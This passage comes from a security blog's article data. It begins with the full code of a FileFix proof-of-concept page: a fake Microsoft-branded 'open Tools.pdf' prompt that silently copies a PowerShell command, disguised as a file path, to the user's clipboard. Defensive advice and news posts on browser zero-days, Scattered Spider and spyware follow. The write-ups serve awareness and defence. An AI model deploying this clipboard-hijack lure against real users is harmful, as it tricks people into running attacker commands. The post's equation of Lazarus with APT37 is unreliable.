    .instructions { text-align: left; padding: 25px 40px 10px; font-size: 15px; color: #333333; line-height: 1.6; }
    .instructions ol { margin: 0; padding-left: 20px; }
    .code-block { background-color: #f1f1f1; border: 1px solid #ccc; border-radius: 4px; padding: 8px 12px; font-family: Consolas, monospace; font-size: 14px; margin-top: 8px; position: relative; transition: background-color 0.3s; cursor: pointer; user-select: none; }
    .code-block:hover { background-color: #e6e6e6; }
    .code-block::after { content: "Copy"; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); font-size: 12px; color: #0078d4; opacity: 0; transition: opacity 0.2s; }
    .code-block:hover::after { opacity: 1; }
    .code-block.clicked::after { content: "Copied"; color: #107c10; }
    #fileExplorer { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 4px; margin: 30px 0 40px; cursor: pointer; }
    #fileExplorer:hover { background-color: #005ea2; }
    .footer { font-size: 11.5px; color: #6b6b6b; background-color: #f7f7f7; padding: 12px 24px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; }
    .footer img { height: 16px; }
    .footer a { color: #6b6b6b; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

  &lt;div class="container"&gt;
    &lt;div class="header"&gt;
      &lt;svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg"&gt;
      &lt;/svg&gt;
      &lt;h3&gt;EthicalByte Hacking Tools are here &quot;Tools.pdf&quot; available to you&lt;/h3&gt;
      &lt;div class="timestamp"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;
    &lt;/div&gt;

    &lt;div class="instructions"&gt;
      &lt;p&gt;To access &lt;strong&gt;Tools.pdf&lt;/strong&gt;, follow these steps:&lt;/p&gt;
      &lt;ol&gt;
        &lt;li style="margin-bottom: 10px;"&gt;
          Copy the file path below
          &lt;div class="code-block" id="path" onclick="this.classList.add('clicked')"&gt;
            C:companyinternal-secure\filedrive	ools.pdf
          &lt;/div&gt;
        &lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Open File Explorer and select the address bar (&lt;strong&gt;CTRL + L&lt;/strong&gt;)&lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Paste the file path and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/div&gt;

    &lt;input type="file" id="fileInput" style="display: none;"&gt;
    &lt;button id="fileExplorer"&gt;Open File Explorer&lt;/button&gt;

    &lt;div class="footer"&gt;
      &lt;img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"&gt;
    &lt;/div&gt;
  &lt;/div&gt;

&lt;script&gt;
const fileInput = document.getElementById('fileInput');
const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
path.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\tools.pdf");
});
fileExplorer.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\Tools.pdf");
    fileInput.click();
});
fileInput.addEventListener('change', () =&gt; {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() =&gt; fileInput.click(), 500);
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>



    <p><img src="https://ethicalbyte.in/blogs/img/rnd/1.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/2.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/3.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    
    <p>A modern replacement doesn’t require a standalone tool—security teams can build or integrate file-processing middleware directly into their web servers or applications. Here’s the core idea:</p>

    <ol>
      <li><strong>Intercept uploads</strong>: Configure your web server or application backend to route every uploaded file through a processing function before it’s saved or shared.</li>
      <li><strong>Scan for hyperlinks</strong>: Use libraries like PyMuPDF for PDFs or python-docx for DOCX files to programmatically extract hyperlinks.</li>
      <li><strong>Rewrite suspicious URLs</strong>: For every detected link, you can:
        <ul>
          <li>Replace it with a safe placeholder like <code>https://warning.local/phishing-link-removed</code>.</li>
          <li>Add visual indicators like “(Link Disabled)” in the document text.</li>
          <li>Remove hyperlinks entirely if they match a denylist of known malicious domains.</li>
        </ul>
      </li>
      <li><strong>Store and serve the sanitized file</strong>: Save the cleaned version of the document and share only this sanitized file with other users.</li>
    </ol>

    <p>This approach allows you to tailor the rules to your organization’s risk tolerance, ensuring that employees or customers aren’t exposed to unexpected phishing links in shared documents.</p>

    <h3>✅ Benefits of Building Your Own FileFix</h3><br>
    <ul>
      <li><strong>Full control over the ruleset</strong> – Customize how aggressive your scanning and rewriting should be.</li>
      <li><strong>No reliance on third-party tools</strong> – Maintain your own codebase, reducing supply chain risk.</li>
      <li><strong>Integration flexibility</strong> – Hook into your existing web application stack, whether it’s Node.js, Python/Django, PHP, or another framework.</li>
      <li><strong>Immediate mitigation</strong> – Uploaded files are cleaned before anyone else can download or view them.</li>
    </ul>

    <h3>⚠️ Important Considerations</h3><br>
    <ul>
      <li><strong>Performance</strong>: Scanning every upload adds processing overhead. Test the impact on upload speeds and server load.</li>
      <li><strong>False positives</strong>: Be careful not to block legitimate URLs unnecessarily—define allowlists for common trusted domains.</li>
      <li><strong>Compliance</strong>: Always ensure that modifying uploaded user content complies with your terms of service and privacy policies.</li>
    </ul>

    <h3>🔚 Conclusion</h3><br>
    <p>Phishing through uploaded files is an often-overlooked attack vector. Although ClickFix is gone, building a custom middleware solution provides a flexible, powerful alternative. By proactively sanitizing file uploads, you can close this security gap and protect your users from malicious links—without relying on outdated or unsupported tools.</p>
  `},{id:"chrome-zero-day-cve-2025-6554-detailed",title:"Google Patches Critical Chrome Zero‑Day CVE‑2025‑6554 – All Users Must Update Now",date:"2025-07-01",author:"Cyber Sentinel",summary:"Google’s emergency update fixes CVE‑2025‑6554, a dangerous zero‑day vulnerability in the Chrome browser’s V8 engine actively exploited in the wild. Learn why this flaw is so critical, how it works, and what steps you must take immediately.",tags:["Chrome","zero-day","browser security","CVE-2025-6554","Google","patch management"],imageKey:"chromeZeroDayExploit",content:`
    <p>On July 1, 2025, Google announced and released an urgent security update for the Chrome web browser, patching CVE‑2025‑6554—a critical zero‑day vulnerability in Chrome’s V8 JavaScript and WebAssembly engine. This vulnerability is already under active exploitation by malicious actors, making it essential for every Chrome user to update immediately.</p>

    <h3>🔎 What is CVE‑2025‑6554 and How Does It Work?</h3><br>
    <p>CVE‑2025‑6554 is a <strong>type confusion flaw</strong> in Chrome’s V8 engine, the core JavaScript and WebAssembly runtime. Type confusion vulnerabilities occur when a program mistakenly assigns a variable of one type as another. In V8, this can enable attackers to manipulate memory outside the intended boundaries of an object, leading to arbitrary code execution.</p>

    <p>Attackers can exploit this by crafting a specially designed website containing malicious JavaScript code. When a user visits such a website, the exploit abuses the vulnerability to execute code on the victim’s system with the same privileges as the browser. This can result in the download of spyware, ransomware, or the establishment of persistent remote access.</p>

    <h3>⚠️ Why CVE‑2025‑6554 is So Dangerous</h3><br>
    <ul>
      <li><strong>Exploitation is already active:</strong> Google confirmed that targeted attacks leveraging this flaw are happening now, not just theoretical proof-of-concepts.</li>
      <li><strong>Drive-by compromise risk:</strong> A single visit to a malicious website can result in compromise without requiring user interaction beyond normal browsing.</li>
      <li><strong>Cross-platform impact:</strong> Because Chrome is used on Windows, macOS, Linux, and forms the core of many Chromium-based browsers, a wide range of users are vulnerable.</li>
      <li><strong>Potential nation-state exploitation:</strong> Experts suggest advanced threat groups may be using this flaw for espionage campaigns against journalists, activists, or enterprises.</li>
    </ul>

    <h3>📜 Context: Chrome’s Zero-Day Track Record in 2025</h3><br>
    <p>This zero-day marks the <strong>fourth actively exploited Chrome vulnerability this year alone</strong>, highlighting a persistent focus by attackers on browser engines as a key attack surface. Earlier 2025 zero-days exploited buffer overflows, type confusion bugs, and sandbox escape techniques—showing consistent interest from cybercriminals and APT groups alike in compromising users directly through web browsing.</p>

    <p>Because browsers are essential gateways to online services, they remain prime targets. Combined with the growing sophistication of exploit kits sold on underground forums, the speed at which zero-days are weaponized continues to accelerate.</p>

    <h3>🛡️ What You Must Do Immediately</h3><br>
    <ol>
      <li><strong>Update Chrome right now:</strong> Ensure your browser is at version 138.0.7204.96 or newer on Windows, macOS, or Linux. Updates can be checked manually by navigating to “Settings > About Chrome.”</li>
      <li><strong>Restart your browser:</strong> Simply updating isn’t enough; Chrome must restart to apply the new security patch.</li>
      <li><strong>Update Chromium-based browsers:</strong> Browsers like Edge, Brave, Opera, and Vivaldi share the V8 engine—these must also be updated promptly to close the same vulnerability.</li>
      <li><strong>Communicate with your organization:</strong> IT teams should push updates across corporate devices and remind employees of the urgent need to patch browsers.</li>
      <li><strong>Harden browsing habits:</strong> Use script-blocking extensions, consider site isolation features in Chrome, and disable unnecessary browser plugins.</li>
    </ol>

    <h3>🔐 How Attackers Are Exploiting CVE‑2025‑6554</h3><br>
    <p>Security researchers discovered the zero-day being delivered through watering-hole attacks—compromising websites known to attract targets, such as industry forums or popular news sites in specific regions. By injecting malicious JavaScript code, attackers silently trigger exploitation chains on visitors’ devices.</p>

    <p>Experts warn that because type confusion exploits can bypass many traditional antivirus solutions (which rely on signatures rather than behavioral detection), only up-to-date browsers or advanced endpoint detection and response (EDR) solutions are likely to catch or block these attacks.</p>

    <h3>📈 Why Browser Zero-Days Are on the Rise</h3><br>
    <p>Browsers like Chrome have become high-value targets because they process untrusted content from the internet in real time. With complex components like JavaScript engines and PDF readers, even a single bug can expose billions of users. Additionally, many organizations have moved critical workflows to web-based platforms, increasing the potential impact of a successful browser exploit.</p>

    <p>The lucrative zero-day market—where brokers can earn six- or seven-figure sums selling working exploits—has incentivized criminal groups and nation-state attackers alike to invest heavily in finding and weaponizing browser vulnerabilities.</p>

    <h3>🛡️ Strengthening Your Browser Security Posture</h3><br>
    <ul>
      <li><strong>Enable automatic updates:</strong> Ensure browsers and extensions update without user intervention.</li>
      <li><strong>Leverage site isolation:</strong> In Chrome, enable “Strict Site Isolation” for an extra layer of defense by running each website in a separate process.</li>
      <li><strong>Use trusted extensions only:</strong> Third-party extensions can introduce their own vulnerabilities or malicious code.</li>
      <li><strong>Adopt DNS-based filtering solutions:</strong> Tools like Secure DNS or enterprise-level DNS filtering can block access to known malicious domains before a browser can connect.</li>
      <li><strong>Monitor web traffic:</strong> Deploy web proxies or next-gen firewalls capable of inspecting SSL traffic for malicious patterns.</li>
    </ul>

    <h3>🔚 Conclusion: Update Now, Stay Vigilant</h3><br>
    <p>Google’s rapid response to CVE‑2025‑6554 shows the importance of timely security patching. But no vendor can act faster than an attacker who already has a zero-day in hand—so staying vigilant, adopting strong security practices, and updating promptly is the best way to reduce risk.</p>

    <p>This isn’t just another security update: the active exploitation means every day you delay updating Chrome or Chromium-based browsers increases your risk of compromise. Take action now to protect your systems, your data, and your privacy.</p>
  `},{id:"scattered-spider-targets-airlines",title:"Airline Industry in the Crosshairs: Scattered Spider Expands Attacks to Qantas and Beyond",date:"2025-07-03",author:"EthicalByte",summary:"The notorious cybercrime group Scattered Spider has expanded its operations from casinos and telecoms to the airline sector, recently breaching systems linked to Qantas, Hawaiian Airlines, and WestJet. Here's everything you need to know.",tags:["airline","scattered spider","qantas","cyberattack","social engineering","mfa","infosec"],imageKey:"scatteredSpiderAirline",content:`
    <h3>✈️ Airlines Are Under Attack</h3><br>
    <p>In July 2025, cybersecurity officials confirmed that the hacking group known as <strong>Scattered Spider</strong> is actively targeting the <strong>airline industry</strong>, marking a dangerous new frontier for one of the world's most critical sectors. What started as a series of attacks against casino chains and tech firms has evolved into a coordinated assault on aviation giants like <strong>Qantas, Hawaiian Airlines, and WestJet</strong>.</p>
    
    <p>While these breaches vary in scope and method, they all rely on the group's signature weapon: <strong>highly targeted social engineering</strong> and <strong>multi-factor authentication (MFA) manipulation</strong>.</p>

    <h3>🕷️ Who Are Scattered Spider?</h3><br>
    <p>Scattered Spider (also known as UNC3944 or Octo Tempest) is a threat actor group composed mostly of teenagers and young adults, fluent in English and technically skilled. They operate under a loosely organized structure and are known for their precision, boldness, and focus on <strong>identity-based attacks</strong>.</p>
    
    <p>Previously, they’ve been linked to major incidents involving MGM Resorts, Caesars Entertainment, and several UK telecom providers. But their recent pivot toward aviation signals a growing ambition — and an increased threat to public infrastructure.</p>

    <h3>🧑‍💻 How They Operate: The Attack Chain</h3><br>
    <p>Scattered Spider doesn’t rely on malware in the traditional sense. Instead, they masterfully exploit human behavior:</p>
    <ol>
      <li><strong>Social Engineering:</strong> Impersonate employees using stolen credentials or fake ID badges</li>
      <li><strong>Help Desk Exploits:</strong> Call IT support to reset MFA or gain access to internal systems</li>
      <li><strong>MFA Fatigue:</strong> Send repeated login requests until users approve them out of annoyance</li>
      <li><strong>Persistence:</strong> Install legitimate remote access tools like AnyDesk or TeamViewer</li>
      <li><strong>Exfiltration:</strong> Access databases, leak files, or encrypt systems for ransom</li>
    </ol>
    <p>They operate with precision, often gathering LinkedIn data or internal IT manuals before striking.</p>

    <h3>🛩️ The Qantas Breach – A Case Study</h3><br>
    <p>Australia’s largest airline, <strong>Qantas</strong>, recently confirmed a data breach affecting nearly 6 million customers. The attackers accessed a third-party call center platform used to manage customer interactions.</p>
    <ul>
      <li>Leaked data includes full names, dates of birth, phone numbers, and frequent flyer numbers</li>
      <li>Qantas stated no passwords, passports, or financial info were compromised</li>
      <li>Security analysts suspect a Scattered Spider-style attack involving help desk impersonation</li>
    </ul>
    <p>This follows similar breaches at <strong>Hawaiian Airlines</strong> and <strong>WestJet</strong>, where attackers reportedly used voice phishing and fake IT personas to gain initial access.</p>

    <h3>🌐 Why the Airline Industry?</h3><br>
    <p>Airlines are attractive targets because:</p>
    <ul>
      <li>They hold massive databases of sensitive customer and travel data</li>
      <li>They rely heavily on third-party vendors with weaker defenses</li>
      <li>Operational delays and reputation damage create strong incentives to pay ransoms</li>
      <li>Call centers and remote workers are common attack vectors</li>
    </ul>
    <p>Additionally, the aviation sector is slow to update legacy systems, giving attackers ample room to move undetected.</p>

    <h3>🔐 What Can Be Done? Defending Against Scattered Spider</h3><br>
    <p>CISA and other global agencies have released urgent guidelines. Here’s what airlines and vendors must do:</p>
    <ul>
      <li><strong>Lock down help desk processes:</strong> Never approve password resets without full identity verification</li>
      <li><strong>Use phishing-resistant MFA:</strong> Like physical security keys (FIDO2)</li>
      <li><strong>Limit remote access:</strong> Disable unused accounts and review RMM tools like AnyDesk regularly</li>
      <li><strong>Segment networks:</strong> So that vendor and staff systems are isolated from core operations</li>
      <li><strong>Run regular simulations:</strong> To train staff on voice phishing and MFA fraud attempts</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The airline industry is not just a travel provider — it’s part of national critical infrastructure. A successful cyberattack can disrupt flights, leak data, damage trust, and even pose safety risks.</p>
    <p>With groups like Scattered Spider shifting targets, all major carriers — and even smaller regional airlines — must reevaluate their defenses. Prevention isn’t just about firewalls anymore. It’s about <strong>human awareness, identity protection, and zero-trust design</strong>.</p>

    <blockquote>Social engineering is the real malware. Train your people. Harden your policies. Don’t wait until your runway becomes a breach path.</blockquote>
  `},{id:"chrome-firefox-critical-update-june-2025",title:"Chrome 138 & Firefox 140 Security Updates: What You Need to Know",date:"2025-07-03",author:"EthicalByte",summary:"Google and Mozilla have released critical security updates for Chrome and Firefox, addressing over two dozen vulnerabilities—including high-severity memory flaws capable of remote code execution. This breakdown explains what’s been fixed, who’s at risk, and how to respond.",tags:["Chrome","Firefox","browser security","memory safety","vulnerability patch"],imageKey:"chromeFirefoxUpdate",content:`
    <p>On June 25, 2025, both Google and Mozilla launched major browser updates: <strong>Chrome 138</strong> and <strong>Firefox 140</strong>. These versions address a combined two dozen vulnerabilities—several of which are high-severity memory safety bugs that can lead to remote code execution. While there’s no confirmed active exploitation in the wild, the risk remains very real, and updating is crucial.</p>

    <h3>🔍 Chrome 138: Eleven Security Fixes</h3><br>
    <p>Chrome 138 brings 11 patches, including memory-related vulnerabilities and logic flaws in browser subsystems:</p>
    <ul>
      <li><strong>Use-after-free in Animation:</strong> Can cause memory corruption; a $4,000 bug bounty was awarded.</li>
      <li><strong>Insufficient policy enforcement in Loader:</strong> Potential for bypassing internal security checks.</li>
      <li><strong>Data validation flaw in DevTools:</strong> Could allow developers to leak or manipulate data—$1,000 reward.</li>
      <li>Other medium and low-level issues across V8, UI, and sandbox components.</li>
    </ul>
    <p>Chrome’s patch—versions 138.0.7204.49/50—reinforces key browser boundaries and safeguards memory handling.</p>

    <h3>🔐 Firefox 140: Thirteen Vulnerabilities Sealed</h3><br>
    <p>Released alongside updates for ESR versions 128.12 and 115.25, Firefox 140 includes fixes for 13 security flaws:</p>
    <ul>
      <li><strong>Use-after-free in FontFaceSet:</strong> Potentially exploitable for arbitrary code execution.</li>
      <li><strong>Memory corruption in media decoding:</strong> Enables remote code execution with malicious files.</li>
      <li>Other critical issues include UUID leaks through WebCompat, XSS via DevTools Save As, policy bypass bugs, and Android phishing loopholes.</li>
    </ul>
    <p>These patches close gaps that could be abused by specially crafted media or web sequences.</p>

    <h3>📌 Why These Updates Matter</h3><br>
    <ul>
      <li>Memory safety flaws allow deep control over browser processes—translating to high-risk remote exploits.</li>
      <li>Drive-by attacks using crafted scripts or media offer no-click compromise potential.</li>
      <li>Chrome and Firefox share core engine technologies—parallel vulnerabilities illustrate shared threat surfaces.</li>
    </ul>

    <h3>🛡️ What You Should Do Immediately</h3><br>
    <ol>
      <li><strong>Update Now:</strong>  
        – Chrome users: upgrade to version 138.0.7204.50+  
        – Firefox users: upgrade to version 140 (and ESR users to 128.12 or 115.25)</li>
      <li><strong>Restart Your Browser:</strong> Patches only take effect after a restart.</li>
      <li><strong>Enable Auto-Updates:</strong> Prevent delays in future patch rollouts.</li>
      <li><strong>Extend to All Browsers:</strong> Update Chromium-based alternatives like Edge, Brave, and Opera.</li>
      <li><strong>Deploy in Enterprise:</strong> IT teams should push patched versions across all endpoints quickly.</li>
    </ol>

    <h3>🔍 Broader Security Lessons</h3><br>
    <ul>
      <li>Frequent memory vulnerabilities show browser engines remain a lucrative exploit target.</li>
      <li>Strong update processes and education can block critical attack channels.</li>
      <li>Complement browser hardening with script control, threat detection, and DNS filtering.</li>
    </ul>

    <h3>🔚 Final Takeaway</h3><br>
    <p>These simultaneous updates from Chrome and Firefox emphasize that even widely-used software remains vulnerable—especially as attackers zero in on core browser components. While no active exploits have been confirmed, patching now offers the best defense. Make updating browsers a non-negotiable part of your cyber hygiene routine.</p>
  `},{id:"north-korea-fake-zoom-macos",title:"North Korean Hackers Spread MacOS Malware Using Fake Zoom Updates",date:"2025-07-04",author:"Ethical Byte",summary:"A new campaign by North Korean state-backed hackers targets MacOS users with malware disguised as Zoom updates. Learn how the attack works and how to stay protected.",tags:["north korea","macos","zoom","malware","social engineering","cyberattack"],imageKey:"northKoreaZoomMalware",content:`
    <h3>🎯 The New Threat: Fake Zoom Updates on MacOS</h3><br>
    <p>In July 2025, cybersecurity researchers uncovered a North Korean-sponsored campaign targeting MacOS users by distributing malware disguised as legitimate Zoom application updates. This attack is part of the group’s ongoing espionage operations aimed at stealing sensitive information from individuals and organizations worldwide.</p>

    <h3>👥 Who’s Behind It?</h3><br>
    <p>The attack is attributed to a threat actor known as <strong>Lazarus Group</strong> (also tracked as UNC4034 or APT37), a state-sponsored hacking group linked to North Korea. Lazarus is infamous for its sophisticated espionage campaigns, financial thefts, and disruption operations targeting governments, defense contractors, and researchers.</p>

    <h3>🧪 How the Attack Works</h3><br>
    <p>Researchers explain that the attackers set up fake websites or send phishing emails offering what appears to be a legitimate Zoom installer for MacOS. However, this installer is a Trojan: it installs malware alongside Zoom.</p>
    <ul>
      <li>The malware establishes persistence on the system by installing launch agents</li>
      <li>It opens a backdoor that allows remote command execution</li>
      <li>It can steal files, record keystrokes, and potentially activate webcams or microphones</li>
      <li>It communicates with command-and-control servers to receive additional payloads</li>
    </ul>

    <h3>🚪 Why MacOS?</h3><br>
    <p>Historically, attackers focused on Windows systems, but the rise in MacOS usage, especially among executives, journalists, and creatives, has made it an attractive target. Mac users often feel a false sense of security because malware on MacOS is less common — but this campaign proves that perception is dangerous.</p>

    <h3>🔎 Why Use Zoom as a Lure?</h3><br>
    <p>Zoom has become an indispensable tool for businesses and individuals worldwide, especially post-pandemic. Since users regularly receive prompts to update Zoom, attackers exploit this expectation to trick victims into installing malware without suspicion.</p>

    <h3>🛡️ How to Protect Yourself</h3><br>
    <p>If you’re a Mac user — or manage a fleet of Macs in your organization — here are practical steps to defend against this attack:</p>
    <ul>
      <li>Only download Zoom and other apps from official websites or app stores</li>
      <li>Enable Gatekeeper and System Integrity Protection (SIP) on your Mac</li>
      <li>Regularly check for unknown login items or launch agents in your system settings</li>
      <li>Keep MacOS and all software up-to-date</li>
      <li>Use endpoint security software capable of detecting MacOS malware</li>
    </ul>

    <h3>🌐 Impact on Organizations</h3><br>
    <p>Beyond individual users, this campaign highlights the risk to organizations that use BYOD (bring-your-own-device) policies or allow personal Macs on corporate networks. A single compromised Mac can act as a bridge into sensitive corporate environments.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>This incident is another reminder that <strong>MacOS is not immune</strong> to cyber threats. Attackers are creative and adaptive — they’ll exploit whatever platforms and habits make it easiest to breach their targets. Staying informed and cautious about where you download software is your best defense.</p>

    <blockquote>🚫 Don't fall for fake updates. Trust only official sources and question every download prompt.</blockquote>
  `},{id:"google-314m-cellular-data-verdict",title:"Google Ordered to Pay $314M for Misusing Android Users’ Cellular Data",date:"2025-07-05",author:"EthicalByte",summary:"A California jury has awarded $314 million to Android users after finding Google intentionally used cellular data from idle devices without consent. Learn what happened, the implications, and how to protect yourself.",tags:["Google","Android","mobile privacy","data misuse","legal verdict"],imageKey:"googleDataVerdict",content:`
    <p>In a landmark July 2025 verdict, a jury in San Jose, California, ruled that Google must pay over $314 million for using Android users’ cellular data when their devices were idle—without proper consent. The class-action case, representing about 14 million Californians, accused Google of unfair data collection practices that benefited the company while burdening users.</p>

    <h3>📊 What the Jury Decided</h3><br>
    <ul>
      <li>Google used cellular data—even when phones were idle or Wi‑Fi wasn’t enabled—to send and receive device information.</li>
      <li>The jury concluded these transfers were “mandatory and unavoidable,” giving Google an unfair advantage and costing users data from their plans.</li>
      <li>The verdict awards $314.6 million, but Google plans to appeal, arguing these data flows are necessary for Android’s security and performance and are disclosed in user agreements.</li>
    </ul>

    <h3>📱 How the Data Transfers Worked</h3><br>
    <p>These transfers occurred in the background—Android phones periodically sent usage logs, network statuses, and app activity to Google servers, regardless of user settings. One test found an idle device using nearly 9 MB of cellular data daily, predominantly communicating with Google even when stationary and unused.</p>

    <h3>🔍 Why This Verdict Matters</h3><br>
    <ul>
      <li><strong>Consumer rights spotlighted:</strong> The ruling reinforces that background data usage requires clear user consent—especially when not tied to Wi‑Fi.</li>
      <li><strong>Standard for tech accountability:</strong> This class-action may influence upcoming trials involving all other U.S. states in April 2026.</li>
      <li><strong>Privacy vs. convenience:</strong> The case highlights tensions between seamless device functionality and user control over data.</li>
    </ul>

    <h3>🛡️ How to Take Control of Your Data</h3><br>
    <ol>
      <li><strong>Monitor cellular usage:</strong> Regularly check your data meter for unexplained background consumption.</li>
      <li><strong>Adjust background settings:</strong> Disable background data for apps and enable “Wi‑Fi only” options in settings.</li>
      <li><strong>Review permissions:</strong> Audit apps accessing device logs or statuses and revoke unnecessary permissions.</li>
      <li><strong>Use data-saving tools:</strong> Employ built-in OS features or third-party apps that restrict idle background transfers.</li>
      <li><strong>Stay informed:</strong> Monitor court outcomes—especially the upcoming trial covering the other U.S. states.</li>
    </ol>

    <h3>⚖️ Google’s Response & What’s Next</h3><br>
    <p>Google contends that these processes support critical system operations—such as performance tuning, security monitoring, and diagnostics—and are disclosed in user agreements. The company will appeal the verdict, claiming the jury misunderstood these essential functions.</p>
    <p>Meanwhile, a broader national class-action is scheduled for April 2026. Should that case mirror California’s decision, the financial and regulatory impact on Google could increase significantly.</p>

    <h3>🔚 Final Takeaway</h3><br>
    <p>This verdict sends a powerful message: users deserve transparency and control over background data usage. Whether or not Google overturns the decision, it's a reminder to take charge of your data privacy—by monitoring usage, adjusting settings, and questioning what runs behind the scenes on your devices.</p>
  `},{id:"taiwan-chinese-apps-data-security",title:"Taiwan Flags Chinese Apps Over Data Security Risks Amid Rising Tensions",date:"2025-07-05",author:"Ethical Byte",summary:"Taiwanese authorities have issued a stern warning about Chinese-developed mobile apps, citing national security and personal privacy concerns. Here’s a comprehensive look at what’s happening and how to protect yourself.",tags:["taiwan","china","mobile security","data privacy","cybersecurity","apps"],imageKey:"taiwanChineseApps",content:`
    <h3>📱 Taiwan Steps Up Against Chinese Apps</h3><br>
    <p>In a move that underscores rising geopolitical and cybersecurity concerns, Taiwan’s National Communications Commission (NCC) and the Ministry of Digital Affairs have jointly warned citizens and businesses about installing and using Chinese-developed apps on their devices. Authorities point to serious risks — ranging from <strong>data harvesting</strong> to potential <strong>espionage</strong> — associated with these apps.</p>

    <h3>🌏 Why Now?</h3><br>
    <p>This warning comes amid heightened tensions across the Taiwan Strait and after several investigations revealed that popular Chinese apps were collecting and transmitting user data back to servers under Beijing’s jurisdiction. Officials described these apps as a possible gateway for surveillance and influence operations aimed at undermining Taiwan’s security and sovereignty.</p>

    <h3>🕵️ How Chinese Apps Collect Your Data</h3><br>
    <p>According to Taiwanese authorities and cybersecurity researchers, many Chinese apps:</p>
    <ul>
      <li>Request broad permissions — including access to camera, microphone, contacts, and location — even when not needed for app functionality</li>
      <li>Send collected data to servers in mainland China, often encrypted and out of reach of Taiwanese (or international) oversight</li>
      <li>Use complex, obfuscated code to mask their true behavior and evade detection</li>
      <li>Continue to track users even after uninstallation, thanks to hidden background services or browser-based trackers</li>
    </ul>

    <h3>⚖️ From Personal Privacy to National Security</h3><br>
    <p>While much of the focus is on personal data privacy, Taiwanese officials stress that these risks extend far beyond individuals. If sensitive devices belonging to government officials, military personnel, or critical infrastructure operators are compromised through such apps, the consequences could include espionage, sabotage, or manipulation of public opinion.</p>

    <p>This is consistent with findings from the U.S., India, and several EU nations, which have similarly restricted or banned Chinese apps in recent years.</p>

    <h3>🚨 Examples of At-Risk Apps</h3><br>
    <p>Although the advisory does not provide an exhaustive list, previous bans in other countries included these widely-used apps:</p>
    <ul>
      <li><strong>TikTok</strong> — for alleged data sharing with Chinese authorities</li>
      <li><strong>WeChat</strong> — for pervasive surveillance capabilities</li>
      <li><strong>QQ</strong> — for questionable encryption and data handling</li>
      <li><strong>CamScanner</strong> — previously found embedding malware in its code</li>
      <li><strong>UC Browser</strong> — for insecure data transmission practices</li>
    </ul>

    <h3>📊 The Bigger Picture: Data Sovereignty</h3><br>
    <p>This move also reflects Taiwan’s broader efforts to assert its <strong>digital sovereignty</strong> and protect its citizens’ data from falling into the hands of foreign powers. In a world where information equals power, letting sensitive data slip beyond your borders can have profound consequences — economically, politically, and even militarily.</p>

    <h3>🛡️ How You Can Protect Yourself</h3><br>
    <p>Here are actionable steps you can take to safeguard your data and reduce risk from questionable apps:</p>
    <ul>
      <li>📲 Download apps only from trusted developers and official app stores</li>
      <li>🔒 Review app permissions — revoke anything unnecessary (e.g., why does a flashlight app need your contacts?)</li>
      <li>🚫 Delete apps you no longer use or don’t trust</li>
      <li>🛡️ Use a mobile security suite capable of detecting privacy-invasive behavior</li>
      <li>🌐 Consider using a VPN to obscure your network traffic</li>
      <li>🔄 Keep your operating system and apps updated to close known vulnerabilities</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>As mobile apps become an integral part of daily life, it’s easy to overlook how much access we grant them — and by extension, their developers. Taiwan’s warning is not just about geopolitics; it’s a reminder that <strong>your privacy is your responsibility</strong>.</p>

    <p>Always ask yourself: who owns this app, where is my data going, and what would happen if it fell into the wrong hands?</p>

    <blockquote>📌 When it comes to apps and your data: trust is good — verification is better.</blockquote>
  `},{id:"catwatchful-android-spyware-leak",title:"Catwatchful Android Spyware Exposes 62,000 User Accounts in Massive Data Leak",date:"2025-07-06",author:"Ethical Byte",summary:"Cybersecurity researchers uncovered a sophisticated spyware campaign targeting Android devices, leaking sensitive data from over 62,000 victims. Learn how Catwatchful works, why it’s dangerous, and how to protect yourself.",tags:["android","spyware","catwatchful","data leak","mobile security","credential theft"],imageKey:"catwatchfulSpyware",content:`
    <h3>🐾 A Silent Predator: What Is Catwatchful?</h3><br>
    <p>In July 2025, researchers at Gbhackers uncovered a large-scale Android spyware campaign dubbed <strong>Catwatchful</strong>, responsible for stealing and leaking personal data from at least <strong>62,000 users worldwide</strong>. This malware has operated largely undetected for months, quietly siphoning data from victims' devices to an attacker-controlled server.</p>

    <p>Unlike simple adware or scams, Catwatchful is a <strong>persistent, highly invasive spyware</strong> that masquerades as legitimate apps and silently takes over the device.</p>

    <h3>📰 What Did Researchers Find?</h3><br>
    <p>The campaign came to light when cybersecurity teams discovered an <strong>unprotected server</strong> operated by the attackers, hosting an enormous trove of stolen credentials, call logs, messages, location data, and more. Researchers were able to analyze the leaked data and map the full scope of the campaign — which had already compromised tens of thousands of Android devices.</p>

